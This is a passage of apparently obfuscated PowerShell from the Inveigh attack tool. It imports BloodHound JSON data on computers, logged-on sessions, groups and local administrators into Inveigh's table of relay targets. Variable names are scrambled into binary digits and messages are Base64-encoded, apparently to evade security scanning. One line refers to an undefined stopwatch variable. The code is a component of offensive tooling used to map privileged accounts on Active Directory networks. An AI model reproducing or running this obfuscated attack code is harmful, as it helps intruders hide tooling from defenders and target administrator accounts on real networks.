        $Computers = (rvpa $Computers).Path
        ${00001111011101111} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${00001111011101111}.MaxJsonLength = 104857600
        ${01011111010111101} = [System.IO.File]::ReadAllText($Computers)
        ${01011111010111101} = ${00001111011101111}.DeserializeObject(${01011111010111101})
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAEMAbwBtAHAAdQB0AGUAcgBzACAASgBTAE8ATgA=')))
        ${01000101101101111} = [System.Diagnostics.Stopwatch]::StartNew()
        ${01011111010111101} = _10010100010101010 ${01011111010111101}
        echo "[+] Parsing completed in $([Math]::Truncate(${01000101101101111}.Elapsed.TotalSeconds)) seconds"
        ${01000101101101111}.Reset()
        ${01000101101101111}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABvACAASQBuAHYAZQBpAGcAaAA=')))
        ${11000000001111010} = [System.Diagnostics.Stopwatch]::StartNew()
        ${10000101000101100} = 0
        if(!${01011111010111101}.Computers)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAYwBvAG0AcAB1AHQAZQByAHMAIABwAGEAcgBzAGUAIABmAGEAaQBsAGUAZAA=')))
            throw
        }
        ${01011111010111101}.Computers | % {
            if(${11000000001111010}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${00000100000110010} = [Math]::Truncate(${10000101000101100} / ${01011111010111101}.Computers.Count * 100)
                if(${00000100000110010} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGMAbwBtAHAAdQB0AGUAcgBzAA=='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMAAwADAAMAAxADAAMAAwADAAMAAxADEAMAAwADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${00000100000110010} -ErrorAction SilentlyContinue
                }
                ${11000000001111010}.Reset()
                ${11000000001111010}.Start()
            }
            ${_00001010101100110} = $_.Name
            [Array]${01000100100111010} = $_.LocalAdmins | ? {$_.Type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))} | select -expand Name
            [Array]${01010100111011001} = $_.LocalAdmins | ? {$_.Type -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))} | select -expand Name
            if($DNS)
            {
                ${_01010101101100010} = _01001011111001111 ${_00001010101100110}
                if(!${_01010101101100010})
                {
                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwACAAZgBvAHIAIAAkAHsAXwAwADAAMAAwADEAMAAxADAAMQAwADEAMQAwADAAMQAxADAAfQAgAGYAYQBpAGwAZQBkAA==')))
                }
            }
            if(!${00111110010010001})
            {
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if((${_00001010101100110} -and ${10001101011100010}.enumerate[${10000101000101100}].Hostname -eq ${_00001010101100110}) -or (${_01010101101100010} -and ${10001101011100010}.enumerate[${10000101000101100}].IP -eq ${_01010101101100010}))
                    {
                        if(${10001101011100010}.enumerate[${10000101000101100}].Hostname -ne ${_00001010101100110} -and ${10001101011100010}.enumerate[${10000101000101100}].IP -eq ${_01010101101100010})
                        {
                            for(${10010111010110000} = 0;${10010111010110000} -lt ${10001101011100010}.enumerate.Count;${10010111010110000}++)
                            {
                                if(${10001101011100010}.enumerate[${10010111010110000}].IP -eq $target)
                                {
                                    ${01100011000100110} = ${10010111010110000}
                                    break
                                }
                            }
                            ${10001101011100010}.enumerate[${01100011000100110}].Hostname = ${_00001010101100110}
                        }
                        else
                        {
                            for(${10010111010110000} = 0;${10010111010110000} -lt ${10001101011100010}.enumerate.Count;${10010111010110000}++)
                            {
                                if(${10001101011100010}.enumerate[${10010111010110000}].Hostname -eq ${_00001010101100110})
                                {
                                    ${01100011000100110} = ${10010111010110000}
                                    break
                                }
                            }
                        }
                        ${10001101011100010}.enumerate[${01100011000100110}]."Administrator Users" = ${01000100100111010}
                        ${10001101011100010}.enumerate[${01100011000100110}]."Administrator Groups" = ${01010100111011001}
                    }
                    else
                    {
                        ${10001101011100010}.enumerate.Add((_00000101010001111 -_00001010101100110 $_.Name -_01010101101100010 ${_01010101101100010} -_00100011111011111 ${01000100100111010} -_10011010010000101 ${01010100111011001})) > $null
                    }
                }
            }
            else
            {
                ${10001101011100010}.enumerate.Add((_00000101010001111 -_00001010101100110 $_.Name -_01010101101100010 ${_01010101101100010} -_00100011111011111 ${01000100100111010} -_10011010010000101 ${01010100111011001})) > $null
            }
            ${_01010101101100010} = $null
            ${_00001010101100110} = $null
            ${01000100100111010} = $null
            ${01010100111011001} = $null
            ${01100011000100110} = $null
            ${10000101000101100}++
        }
        echo "[+] Import completed in $([Math]::Truncate(${01000101101101111}.Elapsed.TotalSeconds)) seconds"
        ${01000101101101111}.Reset()
        rv bloodhound_computers
    }
    if($Sessions)
    {
        $Sessions = (rvpa $Sessions).Path
        ${01100111001000101} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${01100111001000101}.MaxJsonLength = 104857600
        ${01010000101101101} = [System.IO.File]::ReadAllText($Sessions)
        ${01010000101101101} = ${01100111001000101}.DeserializeObject(${01010000101101101})
        ${01000101101101111} = [System.Diagnostics.Stopwatch]::StartNew()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAFMAZQBzAHMAaQBvAG4AcwAgAEoAUwBPAE4A')))
        ${01010000101101101} = _10010100010101010 ${01010000101101101}
        echo "[+] Parsing completed in $([Math]::Truncate(${01000101101101111}.Elapsed.TotalSeconds)) seconds"
        ${01000101101101111}.Reset()
        ${01000101101101111}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAHMAZQBzAHMAaQBvAG4AcwAgAHQAbwAgAEkAbgB2AGUAaQBnAGgA')))
        ${11000000001111010} = [System.Diagnostics.Stopwatch]::StartNew()
        ${10000101000101100} = 0
        if(!${01010000101101101}.Sessions)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAcwBlAHMAcwBpAG8AbgBzACAAcABhAHIAcwBlACAAZgBhAGkAbABlAGQA')))
            throw
        }
        ${01010000101101101}.Sessions | % {
            if(${11000000001111010}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${00000100000110010} = [Math]::Truncate(${10000101000101100} / ${01010000101101101}.Sessions.Count * 100)
                if(${00000100000110010} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAHMAZQBzAHMAaQBvAG4AcwA='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMAAwADAAMAAxADAAMAAwADAAMAAxADEAMAAwADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${00000100000110010} -ErrorAction SilentlyContinue
                }
                ${11000000001111010}.Reset()
                ${11000000001111010}.Start()
            }
            ${_00001010101100110} = $_.ComputerName
            if(${_00001010101100110} -as [IPAddress] -as [Bool])
            {
                ${_01010101101100010} = ${_00001010101100110}
                ${_00001010101100110} = $null
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                    {
                        ${01100011000100110} = ${10000101000101100}
                        break
                    }
                }
            }
            else
            {
                for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                {
                    if(${10001101011100010}.enumerate[${10000101000101100}].Hostname -eq ${_00001010101100110})
                    {
                        ${01100011000100110} = ${10000101000101100}
                        break
                    }
                }
                if($DNS)
                {
                    ${_01010101101100010} = _01001011111001111 ${_00001010101100110}
                    if(!${_01010101101100010})
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwACAAZgBvAHIAIAAkAHsAXwAwADAAMAAwADEAMAAxADAAMQAwADEAMQAwADAAMQAxADAAfQAgAGYAYQBpAGwAZQBkACAAbwByACAASQBQAHYANgAgAGEAZABkAHIAZQBzAHMA')))
                    }
                }
            }
            if(!${00111110010010001} -or ${01100011000100110} -ge 0)
            {
                [Array]${01011001011110011} = ${10001101011100010}.enumerate[${01100011000100110}].Sessions
                if(${01011001011110011} -notcontains $_.UserName)
                {
                    ${01011001011110011} += $_.UserName
                    ${10001101011100010}.enumerate[${01100011000100110}].Sessions = ${01011001011110011}
                }
            }
            else
            {   
                ${10001101011100010}.enumerate.Add($(_00000101010001111 -_00001010101100110 ${_00001010101100110} -_01010101101100010 ${_01010101101100010} -Sessions $_.UserName)) > $null
            }
            ${_00001010101100110} = $null
            ${_01010101101100010} = $null
            ${01011001011110011} = $null
            ${01100011000100110} = $null
            ${10000101000101100}++
        }
        echo "[+] Import completed in $([Math]::Truncate(${01000101101101111}.Elapsed.TotalSeconds)) seconds"
        ${01000101101101111}.Reset()
        rv bloodhound_sessions
    }
    if($Groups)
    {
        $Groups = (rvpa $Groups).Path
        ${10101001011001100} = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        ${10101001011001100}.MaxJsonLength = 104857600
        ${01101110110011100} = [System.IO.File]::ReadAllText($Groups)
        ${01101110110011100} = ${10101001011001100}.DeserializeObject(${01101110110011100})
        ${01000101101101111} = [System.Diagnostics.Stopwatch]::StartNew()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAQgBsAG8AbwBkAEgAbwB1AG4AZAAgAEcAcgBvAHUAcABzACAASgBTAE8ATgA=')))
        ${01101110110011100} = _10010100010101010 ${01101110110011100}
        echo "[+] Parsing completed in $([Math]::Truncate(${01000101101101111}.Elapsed.TotalSeconds)) seconds"
        ${01000101101101111}.Reset()
        ${01000101101101111}.Start()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGcAcgBvAHUAcABzACAAdABvACAASQBuAHYAZQBpAGcAaAA=')))
        ${11000000001111010} = [System.Diagnostics.Stopwatch]::StartNew()
        ${10000101000101100} = 0
        if(!${01101110110011100}.Groups)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABKAFMATwBOACAAZwByAG8AdQBwAHMAIABwAGEAcgBzAGUAIABmAGEAaQBsAGUAZAA=')))
            throw
        }
        ${01101110110011100}.Groups | % {
            if(${11000000001111010}.Elapsed.TotalMilliseconds -ge 500)
            {
                ${00000100000110010} = [Math]::Truncate(${10000101000101100} / ${01101110110011100}.Groups.Count * 100)
                if(${00000100000110010} -le 100)
                {
                    Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABJAG0AcABvAHIAdABpAG4AZwAgAGcAcgBvAHUAcABzAA=='))) -Status $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMAAwADAAMAAxADAAMAAwADAAMAAxADEAMAAwADEAMAB9ACUAIABDAG8AbQBwAGwAZQB0AGUAOgA='))) -PercentComplete ${00000100000110010} -ErrorAction SilentlyContinue
                }
                ${11000000001111010}.Reset()
                ${11000000001111010}.Start()
            }
            [Array]${00111110001011001} = $_.Members | select -expand MemberName
            ${10001101011100010}.group_table.Add($_.Name,${00111110001011001})
            ${00111110001011001} = $null
            ${10000101000101100}++
        }
        echo "[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds"
    }
}

